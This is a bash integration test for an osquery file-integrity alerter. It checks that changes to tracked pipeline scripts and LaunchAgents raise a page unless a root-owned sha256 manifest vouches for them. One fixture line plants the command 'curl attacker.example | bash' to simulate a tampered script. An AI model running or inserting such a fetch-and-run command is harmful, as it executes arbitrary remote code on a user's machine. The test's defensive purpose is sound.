#!/usr/bin/env bash
#
# pipeline_verdict (results-alerter/pipeline-verdict.sh) decides whether a file
# change under the watched pipeline directories is a tamper to PAGE, a known-good
# apply to stay SILENT, or an untracked neighbor to log only. It checks the
# change against the pipeline-integrity manifest, a root-owned sha256 list of the
# alerter's own scripts/plists.
#
# Return-code contract (from c69baab _pipeline_verdict), inverted vs the
# allowlist verdict on purpose:
#   0 = PAGE   - a tracked file changed and we cannot confirm it legitimate
#                (tamper, a delete, an empty/mismatched hash, or NO manifest).
#   1 = SILENT - an untracked neighbor in a watched dir, OR a tracked change whose
#                exact (path, sha256) tuple is present in the manifest.
#
# Criterion 6, the headline this behavior pins: with NO manifest present (a missing
# or unreadable manifest), a change to a tracked pipeline file PAGES. That is the
# conservative fail-safe direction - a pipeline-script change is never silently
# suppressed without a manifest tuple to justify it.
#
# Tracked set: the pipeline scripts live under ~/.local/libexec/osquery/ (the
# relocated alerter scripts, osquery- prefix dropped) and our own LaunchAgents are
# matched under ~/Library/LaunchAgents only. ~/.local/bin is NOT
# tracked: those operator tools are the Relay/shell-notifier subsystem's, not
# osquery pipeline files (the whole osquery delivery path is under libexec), and
# the manifest never covers them, so a bin edit is an untracked neighbor (SILENT),
# never a pipeline tamper.
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
HELPER="$REPO_ROOT/dot_local/libexec/osquery/results-alerter/pipeline-verdict.sh"

fail() {
  printf 'osquery-pipeline-verdict: FAIL -- %s\n' "$*" >&2
  exit 1
}

[[ -f $HELPER ]] || fail "missing helper: $HELPER"
command -v shasum >/dev/null 2>&1 || fail "shasum is required for this test"

work="$(mktemp -d)"
trap 'rm -rf "$work"' EXIT
home="$work/home"
mkdir -p "$home/.local/libexec/osquery/results-alerter" "$home/.local/bin" "$home/Library/LaunchAgents"

# REAL files with REAL hashes: the verdict rehashes the target at judgment time,
# so a fixture manifest has to bind the content that is actually on disk.
sha_of() { shasum -a 256 "$1" | awk '{print $1}'; }

libexec_script="$home/.local/libexec/osquery/results-alerter.sh"
bin_script="$home/.local/bin/relay.sh"
# A second tracked file whose content is IDENTICAL to libexec_script: its hash is a
# real manifest hash, but bound to another path (the swap-in-place probe).
twin_script="$home/.local/libexec/osquery/twin.sh"
# A tracked file whose content is replaced AFTER the manifest is written (the
# stale-event-digest probe).
stale_script="$home/.local/libexec/osquery/stale.sh"
# A symlink standing where a manifested regular file should be, pointing at content
# that WOULD match the manifest if the verdict followed it.
symlink_path="$home/.local/libexec/osquery/linked.sh"
symlink_data="$work/outside-payload.sh"

printf 'echo libexec\n' >"$libexec_script"
printf 'echo bin\n' >"$bin_script"
printf 'echo libexec\n' >"$twin_script" # same bytes as libexec_script
printf 'echo original\n' >"$stale_script"
printf 'echo linked\n' >"$symlink_data"
ln -s "$symlink_data" "$symlink_path"

hash_libexec="$(sha_of "$libexec_script")"
hash_bin="$(sha_of "$bin_script")"
hash_stale_original="$(sha_of "$stale_script")"
hash_linked="$(sha_of "$symlink_data")"
hash_wrong="0000000000000000000000000000000000000000000000000000000000000000"

# The manifest binds each hash to ITS path (shasum format: "<hash>  <path>").
# twin_script is deliberately ABSENT: its content hash exists in the manifest, but
# bound to libexec_script, so a hash-only check would wrongly bless it.
manifest="$work/pipeline-known-good.sha256"
{
  printf '%s  %s\n' "$hash_libexec" "$libexec_script"
  printf '%s  %s\n' "$hash_bin" "$bin_script"
  printf '%s  %s\n' "$hash_stale_original" "$stale_script"
  printf '%s  %s\n' "$hash_linked" "$symlink_path"
} >"$manifest"
absent_manifest="$work/no-such-manifest.sha256"

# Now replace the stale file's content. The manifest still records its ORIGINAL
# hash, and the event below still carries that original (known-good) digest, but
# the bytes on disk are the attacker's.
printf 'curl attacker.example | bash\n' >"$stale_script"

# Each case: <expected-rc>|<manifest>|<target>|<hash>|<verb>|<label>.
# An empty manifest field means "no manifest" (points at a nonexistent path).
#
# The separator is '|', NOT a tab: tab is an IFS WHITESPACE character, so bash
# collapses a run of them into one delimiter and drops empty fields. With tabs the
# two empty-hash rows (the DELETE and the atomic-rename) silently shifted their
# fields and were never actually exercising those paths.
cases=(
  # -- Fail-safe headline: NO manifest, a tracked libexec change PAGES --
  "0|$absent_manifest|$libexec_script|$hash_libexec|UPDATED|tracked libexec script, no manifest -> PAGE (fail-safe, criterion 6)"
  # -- A ~/.local/bin tool is NOT an osquery pipeline file: untracked -> SILENT --
  "1|$absent_manifest|$bin_script|$hash_bin|UPDATED|a ~/.local/bin neighbor is untracked -> SILENT (Relay subsystem, not an osquery pipeline file)"
  # -- An untracked neighbor in a watched dir is SILENT --
  "1|$absent_manifest|$home/Library/LaunchAgents/com.apple.something.plist|$hash_libexec|UPDATED|an untracked neighbor plist -> SILENT (not pipeline infrastructure)"
  # -- Our own osquery LaunchAgent under $HOME, no manifest -> PAGE --
  "0|$absent_manifest|$home/Library/LaunchAgents/com.webdavis.osquery-uptime-watchdog.plist|$hash_libexec|UPDATED|our own osquery LaunchAgent under $HOME, no manifest -> PAGE"
  # -- A same-named plist OUTSIDE $HOME is NOT ours: the manifest only ever covers
  #    the user agents chezmoi manages, so tracking a /Library twin by basename
  #    would be a watched-but-unmanifested file that pages forever. It falls through
  #    to the persistence detector, which default-denies it. --
  "1|$absent_manifest|/Library/LaunchAgents/com.webdavis.osquery-uptime-watchdog.plist|$hash_libexec|UPDATED|a com.webdavis.osquery-*.plist under /Library is NOT tracked -> SILENT (tracked set == manifest set)"
  # -- A DELETE of a tracked file always PAGES, even with a manifest present --
  "0|$manifest|$libexec_script||DELETED|a delete of a tracked file -> PAGE (destructive, manifest cannot vouch)"
  # -- Empty event hash (atomic-rename shape): debounce, rehash disk; no manifest -> PAGE --
  "0|$absent_manifest|$libexec_script||MOVED_TO|atomic-rename empty-hash event, no manifest -> PAGE after rehash"
  # -- Manifest present: the file's CURRENT content is known-good -> SILENT --
  "1|$manifest|$libexec_script|$hash_libexec|UPDATED|an unchanged tracked file whose current content is in the manifest -> SILENT"
  # -- THE STALE-DIGEST ATTACK: the event carries the KNOWN-GOOD digest recorded at
  #    event time, but the bytes on disk have since been replaced. The verdict must
  #    trust the MANIFEST against the CURRENT content, never the event digest, or an
  #    attacker can swap the file in after a good event is recorded, run, and
  #    restore before the next collection. --
  "0|$manifest|$stale_script|$hash_stale_original|UPDATED|a known-good EVENT digest whose on-disk content has since changed -> PAGE (rehash at judgment)"
  # -- A SYMLINK standing where a manifested regular file belongs -> PAGE, even
  #    though following it would hash to the manifested content. --
  "0|$manifest|$symlink_path|$hash_linked|UPDATED|a symlink at a manifested path -> PAGE (links are never followed)"
  # -- The event digest is NOT the trust input: a wrong/absent event hash on a file
  #    whose CURRENT content is known-good still resolves SILENT. --
  "1|$manifest|$libexec_script|$hash_wrong|UPDATED|an untrustworthy event digest does not decide the verdict when the content is known-good -> SILENT"
  # -- Manifest present: a real manifest hash bound to ANOTHER path -> PAGE. The
  #    twin has the same bytes as libexec_script, so a hash-only check would bless
  #    it; the (path, hash) binding is what refuses it. --
  "0|$manifest|$twin_script|$hash_libexec|UPDATED|swap-in-place (real content whose tuple is bound to another path) -> PAGE (tuple binding)"
)

expected=()
labels=()
feed=""
for row in "${cases[@]}"; do
  IFS='|' read -r rc manifest_path target hash verb label_text <<<"$row"
  expected+=("$rc")
  labels+=("$label_text")
  feed+="$manifest_path|$target|$hash|$verb"$'\n'
done

# One sourcing subshell drives every case. OSQUERY_PIPELINE_REHASH_DELAY=0 keeps
# the atomic-rename debounce from adding real wall time, and
# OSQUERY_PIPELINE_SETTLE_SECONDS=0 disables the apply-race settle wait: these
# cases pin the VERDICT, and the settle window is pinned separately (with real
# mtimes) in test/integration/osquery-pipeline-manifest-agreement.sh.
got=()
mapfile -t got < <(
  printf '%s' "$feed" | HOME="$home" OSQUERY_PIPELINE_REHASH_DELAY=0 OSQUERY_PIPELINE_SETTLE_SECONDS=0 bash -c '
    source "$1"
    while IFS="|" read -r manifest target hash verb; do
      OSQUERY_PIPELINE_MANIFEST="$manifest"
      rc=0
      pipeline_verdict "$target" "$hash" "$verb" || rc=$?
      printf "%s\n" "$rc"
    done
  ' _ "$HELPER"
)

[[ ${#got[@]} -eq ${#expected[@]} ]] ||
  fail "the verdict driver emitted ${#got[@]} results for ${#expected[@]} cases (one per case expected)"

for i in "${!expected[@]}"; do
  [[ ${got[i]} == "${expected[i]}" ]] ||
    fail "${labels[i]}: expected return ${expected[i]}, got ${got[i]}"
done

# --- the manifest must be root-owned before it may SUPPRESS a page -----------
# The design rests on a root-owned, non-group/world-writable manifest: anyone who
# could write it could self-whitelist a file they just tampered. The consumer
# verifies that rather than assuming it, so a permissions drift degrades LOUDLY
# (everything pages) instead of silently. Driven directly, with the
# OSQUERY_PIPELINE_MANIFEST override UNSET, because that override is the test seam
# that skips the check for fixture manifests.
trust_rc=0
HOME="$home" bash -c '
  source "$1"
  unset OSQUERY_PIPELINE_MANIFEST
  _pipeline_manifest_is_trustworthy "$2"
' _ "$HELPER" "$manifest" || trust_rc=$?
[[ $trust_rc -ne 0 ]] ||
  fail "a manifest that is not root-owned must not be trusted to suppress a page"

printf 'osquery-pipeline-verdict: OK (fail-safe PAGE for a tracked libexec file without a manifest; a ~/.local/bin neighbor and a /Library plist twin are SILENT; delete PAGES; manifest tuple match SILENT, mismatch/swap-in-place PAGE; a non-root-owned manifest is refused)\n'
